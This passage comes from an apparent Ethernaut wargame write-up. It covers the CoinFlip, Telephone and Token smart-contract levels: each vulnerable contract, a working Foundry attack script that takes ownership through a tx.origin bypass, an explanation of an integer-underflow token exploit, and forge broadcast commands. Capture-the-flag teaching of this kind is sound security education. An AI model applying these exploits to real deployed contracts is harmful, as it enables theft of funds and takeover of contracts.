&lt;&#x2F;span&gt;&lt;span&gt;    uint256 blockValue &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;blockhash&lt;&#x2F;span&gt;&lt;span&gt;(block&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;number &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(lastHash &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;blockValue) {
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;revert&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    lastHash &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;blockValue&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 coinFlip &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;blockValue &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F; &lt;&#x2F;span&gt;&lt;span&gt;FACTOR&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    bool side &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;coinFlip &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;? &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;true &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;false&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(side &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;_guess) {
&lt;&#x2F;span&gt;&lt;span&gt;      consecutiveWins&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;++&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;true&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    } &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;      consecutiveWins &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;false&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;To run script :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; source .env
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; forge script script&#x2F;CoinFlipSolve.s.sol:CoinFlipSolve&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --rpc-url &lt;&#x2F;span&gt;&lt;span&gt;$RPC_URL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --broadcast
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;4-telephone&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#4-telephone&quot; aria-label=&quot;Anchor link for: 4-telephone&quot;&gt;4 Telephone&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;code&gt;Telephone.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Telephone {
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  address public owner&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;constructor&lt;&#x2F;span&gt;&lt;span&gt;() {
&lt;&#x2F;span&gt;&lt;span&gt;    owner &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;changeOwner&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address _owner&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(tx&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;origin &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender) {
&lt;&#x2F;span&gt;&lt;span&gt;      owner &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;_owner&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Goal&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;Claim the ownership of the Telephone contract&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;ul&gt;
&lt;li&gt;Solution&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;Simply call the &lt;code&gt;changeOwner()&lt;&#x2F;code&gt; function from a contract.&lt;&#x2F;li&gt;
&lt;li&gt;If the &lt;code&gt;msg.sender&lt;&#x2F;code&gt; is equals to &lt;code&gt;tx.origin&lt;&#x2F;code&gt; which means the call was from a EOA. If its not, then the call is from a contract.&lt;&#x2F;li&gt;
&lt;li&gt;EOA is the address which originates any transation in the ethereum.&lt;&#x2F;li&gt;
&lt;li&gt;So, we have to call the &lt;code&gt;changeOwner()&lt;&#x2F;code&gt; from an Attack contract.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;&lt;code&gt;TelephoneSolve.s.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;Script.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;console.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;{Telephone} &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;..&#x2F;src&#x2F;Telephone.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract TelephoneSolve is Script{
&lt;&#x2F;span&gt;&lt;span&gt;    Telephone public telephone &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Telephone&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xbB45D0C7AC29151e0309338a63a7fFEffA348585&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;startBroadcast&lt;&#x2F;span&gt;&lt;span&gt;(vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;envUint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;PRIVATE_KEY&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Original Owner : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;telephone&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;owner&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        Attack attack &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;Attack&lt;&#x2F;span&gt;&lt;span&gt;(telephone)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Attack Address : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(attack))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;New Owner : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;telephone&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;owner&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;stopBroadcast&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Attack{
&lt;&#x2F;span&gt;&lt;span&gt;    Telephone public telephone&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;constructor&lt;&#x2F;span&gt;&lt;span&gt;(Telephone _telephone){
&lt;&#x2F;span&gt;&lt;span&gt;        telephone &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;_telephone&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        telephone&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;changeOwner&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x699BceEbD59a5b52bB586C737cD7ba636f3Fe602&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;To run script :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; source .env
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; forge script script&#x2F;TelephoneSolve.s.sol:TelephoneSolve&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --rpc-url &lt;&#x2F;span&gt;&lt;span&gt;$RPC_URL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --broadcast
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;5-token&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#5-token&quot; aria-label=&quot;Anchor link for: 5-token&quot;&gt;5 Token&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;code&gt;Token.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.6&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Token {
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mapping&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;=&amp;gt; &lt;&#x2F;span&gt;&lt;span&gt;uint) balances&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  uint public totalSupply&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;constructor&lt;&#x2F;span&gt;&lt;span&gt;(uint _initialSupply) public {
&lt;&#x2F;span&gt;&lt;span&gt;    balances[msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;totalSupply &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;_initialSupply&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;transfer&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address _to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint _value&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public returns &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(balances[msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span&gt;_value &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    balances[msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-= &lt;&#x2F;span&gt;&lt;span&gt;_value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    balances[_to] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span&gt;_value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;true&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address _owner&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public view returns &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint balance&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;balances[_owner]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Goal&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;We have initial token balance of 20, we need to get ourself more tokens.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;Solution :&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;This contract uses solidity pragma &lt;code&gt;0.6.0&lt;&#x2F;code&gt;, in which no arithmetic overflow&#x2F;underflow checks are not performed by default.&lt;&#x2F;li&gt;
&lt;li&gt;In &lt;code&gt;transfer()&lt;&#x2F;code&gt; function the require check can be bypassed when we pass value as more than 20.&lt;&#x2F;li&gt;
&lt;li&gt;20 - 21 = -1 which results in &lt;code&gt;2**256 - 1&lt;&#x2F;code&gt;. Which is &lt;code&gt;&amp;gt;= 0&lt;&#x2F;code&gt; and the same will happens in the update of balance at sender.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;balances[msg.sender] -= _value;&lt;&#x2F;code&gt; will become balance[msg.sender] = 20 - 21 = 2**256 - 1.&lt;&#x2F;li&gt;
&lt;li&gt;A huge amount of tokens to our account.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;To run script :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; source .env
